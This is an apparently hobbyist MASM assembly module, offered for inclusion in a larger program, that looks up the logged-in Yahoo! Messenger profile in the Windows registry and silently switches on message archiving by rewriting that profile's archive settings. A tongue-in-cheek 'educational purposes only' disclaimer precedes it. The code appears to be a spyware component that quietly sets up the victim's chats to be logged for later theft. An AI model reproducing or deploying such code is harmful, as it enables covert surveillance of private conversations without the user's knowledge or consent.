;This file is created by fakedminded so please if you want to rip it in your code
;then dont forget mentioning me ;) and uhh,,dont make a hazardous
;thing with it ,(just 4 educational purbooses only ...)
;fakedminded 



.code        ;juz include it 'include email_accesory.asm' after all includes 0K

EnableArchive proc      ;plz include advapi32.lib and .inc b4 including this function

.data?
reg_handle dd ?

profile_name db 512 dup(?)
buffer_keyname_e db  512 dup(?)

.data
keyname db "Software\yahoo\pager\",0
valuename db "Yahoo! User ID",0 
cont db "\Archive",0
valuename_e db "Enabled",0
valuename_e1 db "ArchiveSettings1",0
valuename_e2 db "DeleteAfter",0


keyname_e db "Software\yahoo\pager\profiles\",0
sz_buffer_keyname_e dd 512
value dd 1
value1 db 0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh

sz_buffer_keyname_e_e dd 4
error_archiver db "there has been error in archive enabling due to registry",0
.code


invoke RegOpenKeyEx,HKEY_CURRENT_USER,offset keyname,0,KEY_ALL_ACCESS,offset reg_handle
cmp eax,0
jne exit_now
invoke RegQueryValueEx,reg_handle,addr valuename,0,0,offset profile_name,addr sz_buffer_keyname_e
invoke RegCloseKey,reg_handle

invoke RtlZeroMemory,offset buffer_keyname_e,512
invoke lstrcpy ,offset buffer_keyname_e,offset keyname_e
invoke lstrcat ,offset buffer_keyname_e,offset profile_name
invoke lstrcat ,offset buffer_keyname_e,offset cont

invoke RegOpenKeyEx,HKEY_CURRENT_USER,offset buffer_keyname_e,0,KEY_ALL_ACCESS,offset reg_handle
cmp eax,0
jne exit_now
mov sz_buffer_keyname_e_e,4

invoke RegSetValueEx,reg_handle,addr valuename_e,0,REG_DWORD,offset value, sz_buffer_keyname_e_e

mov value,0ah
invoke RegSetValueEx,reg_handle,addr valuename_e2,0,REG_DWORD,offset value, sz_buffer_keyname_e_e

mov sz_buffer_keyname_e_e,8

invoke RegSetValueEx,reg_handle,addr valuename_e1,0,REG_BINARY,offset value1, sz_buffer_keyname_e_e

invoke RegCloseKey,reg_handle

;invoke MessageBox,0,offset buffer_keyname_e,offset profile_name,0
ret
exit_now:
;invoke MessageBox,0,offset error_archiver,offset profile_name,0
mov eax,1

ret
EnableArchive endp

